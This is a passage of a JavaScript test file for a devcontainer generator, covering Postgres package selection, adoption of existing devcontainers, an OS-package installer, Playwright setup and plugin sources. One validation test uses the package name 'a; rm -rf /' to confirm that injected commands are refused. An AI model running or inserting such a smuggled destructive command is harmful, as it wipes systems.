        stanza('postgresql-18', '18.6-1.pgdg13+2', 'locales | locales-all, postgresql-client-18 (= 18.6-1.pgdg13+2), postgresql-common (>= 275~), ssl-cert, tzdata, debconf (>= 0.5) | debconf-2.0, libc6 (>= 2.38), libpq5 (>= 17~~), libssl3t64 (>= 3.4.0)'),
        stanza('postgresql-18', '18.5-1.pgdg13+1'),
        stanza('postgresql-client-18', '18.6-1.pgdg13+2', 'libpq5 (>= 18.6), postgresql-client-common (>= 182~), sensible-utils, libc6 (>= 2.34), libssl3t64 (>= 3.0.0)'),
        stanza('postgresql-18-pgvector', '0.8.7-1.pgdg13+1', 'postgresql-18, libc6 (>= 2.38)'),
        stanza('libpq5', '17.11-1.pgdg13+2'),
        stanza('libpq5', '18.6-1.pgdg13+2', 'libc6 (>= 2.38)'),
        stanza('libpq5', '19~rc1-1.pgdg13+1'),
        ...extra,
      ].join('\n'),
    );
  const version = (selected, name) => selected.find((entry) => entry.name === name)?.version;
  ok(version(selectPackages(index(), '18', ['pgvector']), 'libpq5') === '18.6-1.pgdg13+2', 'libpq5 is not the major\'s, with a prerelease of the next one in the index');
  ok(version(selectPackages(index([stanza('libpq5', '19.0-1.pgdg13+1')]), '18', ['pgvector']), 'libpq5') === '18.6-1.pgdg13+2', 'at 19 GA, Postgres 18 would float to libpq5 19.0: a "no tilde" rule is back');
  ok(version(selectPackages(index([stanza('postgresql-18', '18.7~beta-1')]), '18', []), 'postgresql-18') === '18.6-1.pgdg13+2', 'a prerelease server was selected');
  const fails = (fn, pattern, what) => {
    try {
      fn();
      ok(false, what);
    } catch (error) {
      ok(pattern.test(error.message), `${what}: ${error.message}`);
    }
  };
  fails(() => selectPackages(index(), '17', []), /no stable postgresql-17/, 'a major the index lacks was not refused');
  fails(() => selectPackages(parsePackages([stanza('postgresql-18', '18.6-1'), stanza('postgresql-client-18', '18.6-1'), stanza('libpq5', '19.0-1')].join('\n')), '18', []), /no stable libpq5/, 'with only another major\'s libpq5 it was not refused');
  fails(() => selectPackages(parsePackages([stanza('postgresql-18', '18.6-1'), stanza('postgresql-client-18', '18.6-1', 'libpq5 (>= 18.6)'), stanza('libpq5', '18.5-1')].join('\n')), '18', []), /wants libpq5/, 'a libpq5 older than its client asks for was not refused');
  const selected = selectPackages(index(), '18', ['pgvector']);
  const closure = buildClosure({ amd64: selected, arm64: selected }, 'https://archive.test');
  ok(closure.systemDepends === 'libc6 (>= 2.38), libssl3t64 (>= 3.4.0), tzdata', `systemDepends drops packaging and each other, merging to the highest minimum: ${closure.systemDepends}`);
  ok(closure.version.startsWith('18.6-') && closure.packages.amd64[0].url === 'https://archive.test/pool/postgresql-18_18.6-1.pgdg13+2.deb', `the closure: ${JSON.stringify(closure).slice(0, 200)}`);
  const movedExtension = selectPackages(index([stanza('postgresql-18-pgvector', '0.8.8-1.pgdg13+1', 'postgresql-18')]), '18', ['pgvector']);
  ok(buildClosure({ amd64: movedExtension, arm64: movedExtension }, 'https://archive.test').version !== closure.version, 'an extension moved with the server still: the directory name did not, so nothing would reinstall');
  const onlyArm = selectPackages(parsePackages([stanza('postgresql-18', '18.6-1', 'libarm1'), stanza('postgresql-client-18', '18.6-1'), stanza('libpq5', '18.6-1')].join('\n')), '18', []);
  fails(() => buildClosure({ amd64: selected, arm64: onlyArm }, 'https://archive.test'), /need different Debian packages/, 'architectures needing different Debian names were not refused');
});

checkAsync('image: an adopted devcontainer gets no second image source — and one that builds from house.Dockerfile is the house\'s', async (ok) => {
  // Its image IS the house's ref: still its own key, so `build` must not be added beside it (two image sources).
  const same = wrapperRepo();
  same.write('.devcontainer/devcontainer.json', '{\n  "image": "mcr.microsoft.com/devcontainers/base:debian"\n}\n');
  const a = await artifacts(same, ['nx', 'agent']);
  ok(a.dc.image === 'mcr.microsoft.com/devcontainers/base:debian' && !('build' in a.dc), `build added beside the project's image: ${a.dcText}`);
  ok(a.dc.remoteUser === 'vscode', 'the house image ref means the house user');

  // Switched to the house build by hand: recognised as the house's — nothing skipped, the house user, idempotent.
  const switched = wrapperRepo();
  switched.write('.devcontainer/devcontainer.json', '{\n  // ours\n  "build": { "dockerfile": "house.Dockerfile", "context": "." }\n}\n');
  const b = await artifacts(switched, ['nx', 'agent']);
  const marker = JSON.parse(switched.read('.devcontainer/.bespunky-devcontainer.json', 'utf8'));
  ok(!marker.adopted.skipped.includes('build') && b.dc.remoteUser === 'vscode' && !('image' in b.dc), `the house build was not recognised: ${JSON.stringify(marker.adopted.skipped)}`);

  // The project's list is SEEDED: a second run never touches it.
  switched.write('.devcontainer/os-packages.txt', 'sox\n');
  await artifacts(switched, ['nx', 'agent']);
  ok(switched.read('.devcontainer/os-packages.txt', 'utf8') === 'sox\n', 'the project package list was overwritten');
});

checkAsync('image: the house build is recognised by ITS file under any spelling; a project file is never overwritten or taken for it', async (ok) => {
  const houseBuilt = async (dc) => {
    const tree = wrapperRepo();
    await artifacts(tree, ['nx', 'agent']); // the house's own house.Dockerfile, as an earlier run left it
    tree.write('.devcontainer/.bespunky-devcontainer.json', JSON.stringify({ owned: false }));
    tree.write('.devcontainer/devcontainer.json', dc);
    const a = await artifacts(tree, ['nx', 'agent']);
    return { a, marker: JSON.parse(tree.read('.devcontainer/.bespunky-devcontainer.json', 'utf8')) };
  };
  for (const [label, dc] of [
    ['./house.Dockerfile', '{ "build": { "dockerfile": "./house.Dockerfile", "context": "." } }'],
    ['legacy dockerFile', '{ "dockerFile": "house.Dockerfile" }'],
  ]) {
    const { a, marker } = await houseBuilt(dc);
    ok(!marker.adopted.skipped.includes('build') && a.dc.remoteUser === 'vscode' && a.dc.mounts.some((m) => m.includes('target=/home/vscode/.claude,')), `${label}: not recognised as the house build (state would land under /root)`);
  }

  // The project's OWN house.Dockerfile (no house marker), and its own installer at the house's path: untouched.
  const theirs = wrapperRepo();
  theirs.write('.devcontainer/house.Dockerfile', 'FROM golang:1.23\n');
  theirs.write('.devcontainer/house.packages.sh', '#!/bin/sh\necho ours\n');
  theirs.write('.devcontainer/devcontainer.json', '{ "build": { "dockerfile": "house.Dockerfile" }, "remoteUser": "gopher" }\n');
  const b = await artifacts(theirs, ['nx', 'agent']);
  ok(b.dockerfile === 'FROM golang:1.23\n' && b.osScript === '#!/bin/sh\necho ours\n', 'a project file at a house path was overwritten');
  ok(JSON.parse(theirs.read('.devcontainer/.bespunky-devcontainer.json', 'utf8')).adopted.skipped.includes('build') && b.dc.mounts.some((m) => m.includes('target=/home/gopher/.claude,')), 'a project house.Dockerfile was taken for the house build');

  // A foreign image where an earlier run left the HOUSE's Dockerfile: removed (it would build the wrong base).
  const foreign = wrapperRepo();
  await artifacts(foreign, ['nx', 'agent']);
  foreign.write('.devcontainer/.bespunky-devcontainer.json', JSON.stringify({ owned: false }));
  foreign.write('.devcontainer/devcontainer.json', '{ "image": "python:3.12" }\n');
  ok((await artifacts(foreign, ['nx', 'agent'])).dockerfile === '', 'a stale house.Dockerfile was left beside a foreign image');

  // The house-ref image: the Dockerfile is offered (switching is safe) and the house knows the image (~/.local mounted).
  const ref = wrapperRepo();
  ref.write('.devcontainer/devcontainer.json', '{ "image": "mcr.microsoft.com/devcontainers/base:debian" }\n');
  const r = await artifacts(ref, ['nx', 'agent']);
  ok(/^FROM mcr\.microsoft\.com\/devcontainers\/base:debian$/m.test(r.dockerfile) && r.dc.mounts.some((m) => m.includes('target=/home/vscode/.local,')), 'house-ref: the Dockerfile or ~/.local missing');
});

checkAsync('image: LF in every checkout, CRLF lists still read, a quote in a why survives, a superseded parked script goes', async (ok) => {
  const tree = wrapperRepo();
  tree.write('.devcontainer/.gitattributes', '*.png binary\n');
  const a = await artifacts(tree, ['nx', 'agent']);
  const attributes = tree.read('.devcontainer/.gitattributes', 'utf8');
  ok(attributes.startsWith('*.png binary\n') && /^\*\.sh text eol=lf$/m.test(attributes) && /^os-packages\.txt text eol=lf$/m.test(attributes), `gitattributes: ${JSON.stringify(attributes)}`);
  await artifacts(tree, ['nx', 'agent']);
  ok(tree.read('.devcontainer/.gitattributes', 'utf8') === attributes, 'gitattributes grew on a second run');

  const crlf = runInstaller(a.osScript, { present: ['tmux', 'curl'], projectList: 'sox\r\nalsa-utils\r\n' });
  ok(crlf.installs.length === 1 && crlf.installs[0].trim() === 'install -y sox alsa-utils', `a CRLF list lost its packages: ${JSON.stringify(crlf.calls)} ${crlf.output}`);

  const { compose, renderOsPackagesScript } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
  const c = compose([{ id: 'x', fragment: { image: { ref: 'img', remoteUser: 'node' }, osPackages: [{ packages: ['jq'], why: "it's $HOME `x` \\ — quoted" }] } }], { nodeMajor: '22' });
  const quoted = runInstaller(renderOsPackagesScript(c), { projectList: '' });
  ok(quoted.status === 0 && quoted.installs[0]?.trim() === 'install -y jq', `a quote in a why broke the embedded list: ${JSON.stringify(quoted)}`);

  // Parked earlier (the project's postCreateCommand ran something else); now the house takes post-create.sh.
  const parked = wrapperRepo();
  parked.write('.devcontainer/devcontainer.json', '{ "image": "mcr.microsoft.com/devcontainers/base:debian", "postCreateCommand": "make setup" }\n');
  await artifacts(parked, ['nx', 'agent']);
  ok(parked.exists('.devcontainer/post-create.bespunky.sh'), 'precondition: the house script was parked beside');
  parked.write('.devcontainer/devcontainer.json', '{ "image": "mcr.microsoft.com/devcontainers/base:debian" }\n');
  await artifacts(parked, ['nx', 'agent']);
  ok(parked.exists('.devcontainer/post-create.sh') && !parked.exists('.devcontainer/post-create.bespunky.sh'), 'the superseded parked script was left (the chain feature would run its stale body first)');
});

checkAsync('chromium: a foreign image keeps Playwright\'s own --with-deps (its distro is unknown); the house image needs none', async (ok) => {
  const foreign = createTreeWithEmptyWorkspace();
  foreign.write('.devcontainer/devcontainer.json', '{ "image": "python:3.12-bookworm", "remoteUser": "pyuser" }\n');
  const f = await artifacts(foreign, ['nx', 'agent', 'node', 'js', 'web']);
  ok(!/(^| )libnss3( |$)/m.test(f.osScript), 'a foreign image got the Chromium names meant for the house images (one wrong name fails the whole apt transaction)');
  ok(f.osScript.includes('tigervnc-standalone-server'), 'the distro-neutral web packages must stay on a foreign image');
  ok(f.post.includes('shared-browser" install --with-deps;') && f.post.includes('playwright install --with-deps chromium'), 'a foreign image lost Playwright\'s own --with-deps');
  const house = await artifacts(createTreeWithEmptyWorkspace(), ['nx', 'agent', 'node', 'js', 'web']);
  ok(!house.post.includes('--with-deps'), 'a house image still runs an apt step for Chromium');
});

checkAsync('installer: a failed batch falls back to one by one, names the culprit, still exits non-zero', async (ok) => {
  const a = await artifacts(wrapperRepo(), ['nx', 'agent']);
  const dir = mkdtempSync(join(tmpdir(), 'os-fallback-'));
  const bin = join(dir, 'bin');
  mkdirSync(bin);
  const log = join(dir, 'apt.log');
  writeFileSync(join(dir, 'house.packages.sh'), a.osScript);
  writeFileSync(join(dir, 'os-packages.txt'), 'sox nosuchpkg\n');
  writeFileSync(join(bin, 'dpkg-query'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
  // A real apt refuses the whole transaction when ONE name is unknown; alone, every other name installs.
  writeFileSync(join(bin, 'apt-get'), `#!/bin/sh\necho "$*" >> '${log}'\ncase "$*" in *nosuchpkg*) exit 100 ;; esac\nexit 0\n`, { mode: 0o755 });
  writeFileSync(join(bin, 'sudo'), '#!/bin/sh\nexec "$@"\n', { mode: 0o755 });
  writeFileSync(join(bin, 'sleep'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  let status = 0;
  let out = '';
  try {
    execFileSync('sh', ['-c', 'sh "$0" "$1" 2>&1', join(dir, 'house.packages.sh'), join(dir, 'os-packages.txt')], { env: { PATH: `${bin}:${process.env.PATH}` }, encoding: 'utf8' });
  } catch (error) {
    status = error.status;
    out = `${error.stdout}`;
  }
  const calls = readFileSync(log, 'utf8').trim().split('\n');
  rmSync(dir, { recursive: true, force: true });
  ok(status !== 0 && /FAILED: nosuchpkg$/m.test(out), `the culprit was not named (status ${status}): ${out}`);
  for (const name of ['tmux', 'curl', 'sox']) ok(calls.includes(`install -y ${name}`), `${name} was not installed on its own after the batch failed`);
});

checkAsync('runtime: an earlier pin\'s playwright-core is removed before the new one installs (its browsers would be kept forever)', async (ok) => {
  const tree = createTreeWithEmptyWorkspace();
  await generator('shared-browser')(tree, {});
  const dir = mkdtempSync(join(tmpdir(), 'sb-runtime-'));
  const bin = join(dir, 'bin');
  const cache = join(dir, 'cache');
  mkdirSync(bin);
  mkdirSync(join(cache, 'bespunky', 'playwright-core@0.0.1', 'node_modules'), { recursive: true });
  mkdirSync(join(cache, 'bespunky', 'unrelated'), { recursive: true });
  writeFileSync(join(dir, 'runtime.mjs'), tree.read('tools/shared-browser/runtime.mjs', 'utf8'));
  // A fake npm: `npm install --prefix <dir> …` lays down the package the runtime checks for.
  writeFileSync(join(bin, 'npm'), '#!/bin/sh\nwhile [ "$1" != "--prefix" ]; do shift; done\nmkdir -p "$2/node_modules/playwright-core" && echo "{}" > "$2/node_modules/playwright-core/package.json"\n', { mode: 0o755 });
  try {
    execFileSync('node', [join(dir, 'runtime.mjs'), 'module'], { env: { PATH: `${bin}:${process.env.PATH}`, XDG_CACHE_HOME: cache, HOME: dir }, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] });
  } catch {
    // `module` may print or exit oddly with a fake package; the filesystem is what is checked.
  }
  const left = readdirSync(join(cache, 'bespunky')).sort();
  rmSync(dir, { recursive: true, force: true });
  ok(!left.includes('playwright-core@0.0.1') && left.includes('unrelated') && left.some((name) => name.startsWith('playwright-core@') && name !== 'playwright-core@0.0.1'), `after installing the pin: ${JSON.stringify(left)}`);
});

checkAsync('post-create is UNATTENDED: no input attached, and yarn 1 fails instead of prompting (yarn 2+ untouched)', async (ok) => {
  const tree = createTreeWithEmptyWorkspace();
  tree.write('yarn.lock', '');
  const a = await artifacts(tree, ['nx', 'agent', 'node']);
  const at = (needle) => a.post.indexOf(needle);
  ok(at('exec < /dev/null') !== -1 && at('exec < /dev/null') < at('$PM_INSTALL'), 'post-create does not detach input before the first install');
  const start = a.post.indexOf('if [ -f "$WS/package.json" ]; then');
  const piece = a.post.slice(start, a.post.indexOf('\nfi\n', start) + 4);
  for (const [version, expected] of [['1.22.22', 'yarn install --non-interactive'], ['4.5.0', 'yarn install']]) {
    const dir = mkdtempSync(join(tmpdir(), 'pm-'));
    const bin = join(dir, 'bin');
    mkdirSync(bin);
    writeFileSync(join(dir, 'package.json'), '{}');
    writeFileSync(join(dir, 'yarn.lock'), '');
    writeFileSync(join(bin, 'yarn'), `#!/bin/sh\n[ "$1" = --version ] && { echo ${version}; exit 0; }\necho "RAN yarn $*" >> '${join(dir, 'log')}'\n`, { mode: 0o755 });
    execFileSync('bash', ['-c', `set -euo pipefail\nWS='${dir}'\n${piece}`], { env: { PATH: `${bin}:${process.env.PATH}` }, encoding: 'utf8' });
    const ran = readFileSync(join(dir, 'log'), 'utf8').trim();
    rmSync(dir, { recursive: true, force: true });
    ok(ran === `RAN ${expected}`, `yarn ${version}: ran "${ran}", expected "${expected}"`);
  }
});

checkAsync('plugins: a marketplace source the user or organisation DECLARED wins; one failure never skips the rest', async (ok) => {
  const a = await artifacts(wrapperRepo(), ['nx', 'agent']);
  const start = a.post.indexOf('# --- Pre-install the Claude Code plugins');
  const piece = a.post.slice(start, a.post.indexOf('\n# --- ', start + 1));
  const run = (settings, { addFails = false } = {}) => {
    const dir = mkdtempSync(join(tmpdir(), 'plugins-'));
    const bin = join(dir, 'bin');
    const cfg = join(dir, 'cfg');
    mkdirSync(bin);
    mkdirSync(cfg);
    if (settings) writeFileSync(join(cfg, 'settings.json'), JSON.stringify(settings));
    const log = join(dir, 'claude.log');
    writeFileSync(join(bin, 'claude'), `#!/bin/sh\necho "$*" >> '${log}'\n${addFails ? 'case "$*" in *"marketplace add"*) exit 1 ;; esac\n' : ''}exit 0\n`, { mode: 0o755 });
    const out = execFileSync('bash', ['-c', `set -euo pipefail\nWS='${dir}'\n${piece}`], { cwd: dir, env: { PATH: `${bin}:${process.env.PATH}`, CLAUDE_CONFIG_DIR: cfg, HOME: dir }, encoding: 'utf8' });
    const calls = readFileSync(log, 'utf8').trim().split('\n');
    rmSync(dir, { recursive: true, force: true });
    return { calls, out };
  };
  const adds = (calls) => calls.filter((c) => c.startsWith('plugin marketplace add')).map((c) => c.replace('plugin marketplace add ', ''));
  ok(adds(run(undefined).calls).includes('BeSpunky/claude-toolkit'), 'nothing declared: the house default source is not used');
  const declaredDir = run({ extraKnownMarketplaces: { 'claude-toolkit': { source: { source: 'directory', path: '/src/claude-toolkit' } } } });
  ok(adds(declaredDir.calls).includes('/src/claude-toolkit') && !adds(declaredDir.calls).includes('BeSpunky/claude-toolkit'), `a declared directory source was not used: ${JSON.stringify(declaredDir.calls)}`);
  const declaredRef = run({ extraKnownMarketplaces: { 'claude-toolkit': { source: { source: 'github', repo: 'BeSpunky/claude-toolkit', ref: 'development' } } } });
  ok(adds(declaredRef.calls).includes('BeSpunky/claude-toolkit#development'), `a declared GitHub ref was not spelled owner/repo#ref: ${JSON.stringify(declaredRef.calls)}`);
  const failing = run(undefined, { addFails: true });
  const installs = failing.calls.filter((c) => c.startsWith('plugin install'));
  ok(installs.length >= 2 && /not pre-installed:.*claude-toolkit\(marketplace\)/.test(failing.out), `a failed marketplace skipped the installs or went unreported: ${JSON.stringify(failing)}`);
});

checkAsync('adopted devcontainer on its own image: only the active layers merged in, no remoteUser imposed, mounts follow its user', async (ok) => {
  const tree = wrapperRepo();
  tree.write('.devcontainer/devcontainer.json', '{\n  // Our Python image.\n  "image": "python:3.12",\n  "postCreateCommand": "pip install -r requirements.txt"\n}\n');
  const a = await artifacts(tree, ['nx', 'agent']);
  ok(a.dc.image === 'python:3.12' && a.dcText.includes('// Our Python image.'), 'the project image and its comment survive');
  ok(!('build' in a.dc), 'the house added a second image source (build) beside the project image');
  ok(a.dockerfile === '' && a.osScript.includes('HOUSE_PACKAGES='), 'a foreign image got a house.Dockerfile (it would build the WRONG base) — or lost the installer post-create runs');
  ok(!a.dc.mounts.some((m) => m.includes('/.local,')), 'the ~/.local volume was mounted over a FOREIGN image (it would freeze what that image ships there)');
  ok(!('remoteUser' in a.dc), `a remoteUser was imposed on an image that may not have it: ${a.dc.remoteUser}`);
  ok(a.dc.mounts.some((m) => m.includes('target=/root/.claude')), `the .claude mount follows the image's user: ${a.dc.mounts}`);
  ok(a.dc.features['ghcr.io/devcontainers/features/node:1.7.1'], 'Node arrives as a feature (the house tooling needs it)');
  ok(!/node_modules|tigervnc|4200|CHOKIDAR/.test(a.dcText), 'an inactive layer leaked into the adopted devcontainer');
  ok(a.dc.postCreateCommand === 'pip install -r requirements.txt' && tree.exists('.devcontainer/post-create.bespunky.sh'), 'their postCreate kept; house script beside it');
  const marker = JSON.parse(tree.read('.devcontainer/.bespunky-devcontainer.json', 'utf8'));
  ok(marker.owned === false && marker.adopted.skipped.includes('build'), `adoption report: ${JSON.stringify(marker.adopted)}`);
});

checkAsync('adopted devcontainer: the house RECORDS what it added, keeps it across runs, and drops what the project changed', async (ok) => {
  const prov = require_(join(BUILD, 'src/generators/_utils/devcontainer-provenance'));
  const DC = '.devcontainer/devcontainer.json';
  const MARKER = '.devcontainer/.bespunky-devcontainer.json';
  const GH = 'ghcr.io/devcontainers/features/github-cli:1.1.3';
  const OURS = 'ghcr.io/example/features/ours';
  const tree = wrapperRepo();
  tree.write(DC, `{\n  "image": "python:3.12",\n  "features": { "${OURS}": {} },\n  "postCreateCommand": "pip install -r requirements.txt"\n}\n`);
  await generator('devcontainer')(tree, { name: 'shop', layers: ['nx', 'agent'] });
  const recorded = () => JSON.parse(tree.read(MARKER, 'utf8')).adopted.houseAdded;
  const has = (entry) => recorded().some((e) => JSON.stringify(e) === JSON.stringify(entry));
  ok(has({ path: ['features', GH], value: {} }), `the house feature it added is recorded: ${JSON.stringify(recorded())}`);
  ok(!recorded().some((e) => e.path[1] === OURS), "the project's own feature is never recorded as the house's");
  ok(!recorded().some((e) => e.path[0] === 'image'), 'a key the house did not write is not recorded');
  ok(recorded().some((e) => e.path[0] === 'mounts' && 'member' in e), 'an appended mount is recorded as a member');
  const pathEntry = recorded().find((e) => e.path.join('.') === 'remoteEnv.PATH');
  ok(pathEntry, 'remoteEnv.PATH (a whole remoteEnv map written at once) is recorded per entry');
  ok(prov.houseWrote(tree, { path: ['features', GH], value: {} }) && !prov.houseWrote(tree, { path: ['features', OURS], value: {} }), 'houseWrote answers from the record');

  // A feature the project declares under another tag is that feature: a second key would install it twice.
  for (const own of ['ghcr.io/devcontainers/features/github-cli', 'ghcr.io/devcontainers/features/github-cli:1', 'ghcr.io/devcontainers/features/github-cli@sha256:abc']) {
    const other = wrapperRepo();
    other.write(DC, `{\n  "image": "python:3.12",\n  "features": { "${own}": {} }\n}\n`);
    await generator('devcontainer')(other, { name: 'shop', layers: ['nx', 'agent'] });
    const ids = Object.keys(parseJsonc(other.read(DC, 'utf8')).features).filter((id) => id.includes('github-cli'));
    ok(ids.length === 1 && ids[0] === own, `a project's ${own} is not joined by the house's: ${ids}`);
  }

  // A second run adds nothing new: the record neither grows nor loses what the FIRST run added.
  const before = recorded().length;
  await generator('devcontainer')(tree, { name: 'shop', layers: ['nx', 'agent'] });
  ok(recorded().length === before && has({ path: ['features', GH], value: {} }), `a re-run keeps the record as it was: ${before} -> ${recorded().length}`);

  // The project edits a value the house added: it is theirs now — out of the record, and houseWrote says no.
  const text = tree.read(DC, 'utf8').replace(pathEntry.value, '/opt/ours/bin:${containerEnv:PATH}');
  tree.write(DC, text);
  await generator('devcontainer')(tree, { name: 'shop', layers: ['nx', 'agent'] });
  ok(!recorded().some((e) => e.path.join('.') === 'remoteEnv.PATH'), 'a value the project changed left the record');
  ok(!prov.houseWrote(tree, pathEntry), 'houseWrote refuses a value the file no longer holds');
  ok(has({ path: ['features', GH], value: {} }), 'everything else the house added is still recorded');
});

checkAsync('owned devcontainer: no provenance record — ownership already answers it', async (ok) => {
  const prov = require_(join(BUILD, 'src/generators/_utils/devcontainer-provenance'));
  const tree = createTreeWithEmptyWorkspace();
  await generator('devcontainer')(tree, { name: 'shop', layers: ['nx', 'agent'] });
  const marker = JSON.parse(tree.read('.devcontainer/.bespunky-devcontainer.json', 'utf8'));
  ok(marker.owned === true && !marker.adopted, `owned marker: ${JSON.stringify(marker)}`);
  ok(prov.houseWrote(tree, { path: ['features', 'anything'], value: {} }), 'an owned file is the house\'s');
});

checkAsync('post-create: web provisions the shared browser through its own runtime; @playwright/test is the js layer\'s', async (ok) => {
  const web = await artifacts(wrapperRepo(), ['nx', 'agent', 'web']);
  ok(web.post.includes('shared-browser" install;') && !web.post.includes('--with-deps'), 'web: the runtime install is not the plain (no apt) `shared-browser install`');
  for (const name of ['xvfb', 'libnss3', 'libgbm1', 'fonts-unifont']) ok(new RegExp(`(^| )${name.replace(/[.+]/g, '\\$&')}( |$)`, 'm').test(web.osScript), `web: Chromium's ${name} is not an image package`);
  ok(!web.post.includes('@playwright/test'), 'web (no js): still keyed on @playwright/test');
  ok(bashParses(web.post), 'web post-create does not parse');
  const tree = createTreeWithEmptyWorkspace();
  const both = await artifacts(tree, ['nx', 'agent', 'node', 'js', 'web']);
  ok(both.post.includes('"@playwright/test"') && both.post.includes('playwright install chromium') && !both.post.includes('--with-deps'), 'js+web: both pieces, neither with an apt step');
  ok((both.osScript.match(/^chromium trixie /gm) ?? []).length === 1, 'js+web: Chromium\'s libraries listed twice (the composer must de-duplicate)');
  const js = await artifacts(createTreeWithEmptyWorkspace(), ['nx', 'agent', 'node', 'js']);
  ok(/(^| )libnss3( |$)/m.test(js.osScript), 'js (no web): @playwright/test\'s Chromium libraries are not image packages');
  const { PLAYWRIGHT_VERSION } = require_(join(BUILD, 'src/generators/_utils/versions'));
  const { CHROMIUM_OS_PACKAGES_VERSION } = require_(join(BUILD, 'src/generators/_utils/playwright-deps'));
  ok(CHROMIUM_OS_PACKAGES_VERSION === PLAYWRIGHT_VERSION, `Chromium's OS packages were projected from playwright-core@${CHROMIUM_OS_PACKAGES_VERSION}, the pin is ${PLAYWRIGHT_VERSION} — run: node tools/playwright-deps/project.mjs --write`);
  // Every release the house images can be on has a list, and a name a release renamed is on the right side of it.
  const { CHROMIUM_OS_PACKAGES } = require_(join(BUILD, 'src/generators/_utils/playwright-deps'));
  const { POSTGRES_DEB_CODENAMES } = require_(join(BUILD, 'src/generators/_utils/versions'));
  ok(POSTGRES_DEB_CODENAMES.every((codename) => CHROMIUM_OS_PACKAGES[codename]?.length), `a release with a Postgres closure has no Chromium list: ${Object.keys(CHROMIUM_OS_PACKAGES)}`);
  ok(CHROMIUM_OS_PACKAGES.trixie.includes('libasound2t64') && CHROMIUM_OS_PACKAGES.bookworm.includes('libasound2') && !CHROMIUM_OS_PACKAGES.bookworm.includes('libasound2t64'), 'the lists are not each its own release\'s names');
  const { chromiumCodenames } = await import('../postgres-debs/image-codenames.mjs');
  ok(chromiumCodenames(readFileSync(join(PAYLOAD, 'src/generators/_utils/playwright-deps.ts'), 'utf8')).join() === Object.keys(CHROMIUM_OS_PACKAGES).join(), 'the weekly tripwire reads other releases than the table holds');
  let shapeMoved = false;
  try { chromiumCodenames('export const X = {};'); } catch { shapeMoved = true; }
  ok(shapeMoved, 'a table the tripwire cannot read is an error, never an empty list');

  // An osPackages group per release, through the real installer: it picks by the image's codename, and refuses one with no list.
  const { compose: composeGroup, renderOsPackagesScript: renderGroup } = require_(join(BUILD, 'src/generators/devcontainer/compose'));
  const perRelease = { id: 'browser', byCodename: { trixie: ['libnew', 'shared'], bookworm: ['libold', 'shared'] }, onHouseImageOnly: true, why: "a release's own names" };
  const composed = (source, ...groups) => composeGroup([{ id: 'x', fragment: { image: { ref: 'img', remoteUser: 'node' }, osPackages: groups } }], { nodeMajor: '22', ...source });
  const script = renderGroup(composed({}, { packages: ['plain', 'shared'] }, perRelease, perRelease));
  ok(script.split("\nbrowser trixie ").length === 2, 'two layers sharing a group must render it once');
  const onRelease = (codename, present = []) => {
    const dir = mkdtempSync(join(tmpdir(), 'os-by-codename-'));
    try {
      const bin = join(dir, 'bin');
      mkdirSync(bin);
      mkdirSync(join(dir, 'root/etc'), { recursive: true });
      if (codename) writeFileSync(join(dir, 'root/etc/os-release'), `ID=debian\nVERSION_CODENAME=${codename}\n`);
      writeFileSync(join(dir, 'house.packages.sh'), script);
      writeFileSync(join(bin, 'dpkg-query'), `#!/bin/sh\nfor last; do :; done\nfor p in ${present.join(' ')}; do [ "$p" = "$last" ] && { printf 'install ok installed'; exit 0; }; done\nexit 1\n`, { mode: 0o755 });
      writeFileSync(join(bin, 'apt-get'), `#!/bin/sh\necho "$*" >> '${join(dir, 'apt.log')}'\n`, { mode: 0o755 });
      writeFileSync(join(bin, 'sudo'), '#!/bin/sh\nexec "$@"\n', { mode: 0o755 });
      const run = spawnSync('sh', ['-c', 'sh "$0" 2>&1', join(dir, 'house.packages.sh')], { env: { PATH: `${bin}:${process.env.PATH}`, HOUSE_PACKAGES_ROOT: join(dir, 'root') }, encoding: 'utf8' });
      const log = existsSync(join(dir, 'apt.log')) ? readFileSync(join(dir, 'apt.log'), 'utf8') : '';
      return { status: run.status, output: run.stdout, install: log.split('\n').find((line) => line.startsWith('install')) ?? '' };
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  };
  const trixie = onRelease('trixie');
  ok(trixie.status === 0 && / plain shared libnew$/.test(trixie.install), `trixie installs its own names, each once: ${trixie.install} ${trixie.output}`);
  const bookworm = onRelease('bookworm');
  ok(bookworm.status === 0 && / plain shared libold$/.test(bookworm.install), `bookworm installs its own names: ${bookworm.install} ${bookworm.output}`);
  const forky = onRelease('forky');
  ok(forky.status !== 0 && /'browser' has no package list for this Debian release \('forky'; it has: trixie bookworm \)/.test(forky.output) && /upgrade it/.test(forky.output), `a release with no list fails by name, with the way out: ${forky.output}`);
  ok(/ plain shared$/.test(forky.install), `…and the rest still installs: ${forky.install}`);
  const forkyDone = onRelease('forky', ['plain', 'shared']);
  ok(forkyDone.status !== 0 && forkyDone.install === '' && !forkyDone.output.includes('all present'), `with nothing else to install, it still fails: ${forkyDone.output}`);
  const nowhere = onRelease(undefined);
  ok(nowhere.status !== 0 && /\('unknown'; it has/.test(nowhere.output), `no readable release fails by name: ${nowhere.output}`);
  ok(onRelease('bookworm', ['plain', 'shared', 'libold']).output.includes('all present'), 'a container built from this image installs nothing');
  const adopted = renderGroup(composed({ imageSource: { kind: 'foreign', runsAs: 'node' } }, { packages: ['plain'] }, perRelease));
  ok(!adopted.includes('libnew') && !adopted.includes('VERSION_CODENAME'), 'onHouseImageOnly keeps its meaning: an adopted image gets neither the names nor a refusal of its release');
  const plainOnly = renderGroup(composed({}, { packages: ['plain'] }));
  ok(!/VERSION_CODENAME|HOUSE_PACKAGES_BY_CODENAME|\{\{/.test(plainOnly), 'a project with no per-release group reads no release: its installer, and its cached layer, do not move');
  for (const [name, group] of [['an id', { id: 'Bad Id', byCodename: { trixie: ['a'] } }], ['a codename', { id: 'x', byCodename: { 'Tri xie': ['a'] } }], ['an empty list', { id: 'x', byCodename: { trixie: [] } }], ['a name', { id: 'x', byCodename: { trixie: ['a; rm -rf /'] } }]]) {
    let refused = false;
    try { renderGroup(composed({}, group)); } catch { refused = true; }
    ok(refused, `a malformed group must be refused before it reaches a root apt-get: ${name}`);
  }
  ok(bashParses(both.post), 'js+web post-create does not parse');
});

// ── volume ownership: DERIVED from the composed mounts, and RUN against a stand-in for Docker's root-owned dirs ──
// Docker creates every fresh named volume — and each missing directory on the way to it — owned by root. The
// reclaim used to be hand-listed per layer, and `node` never listed node_modules: every node-hosted project's
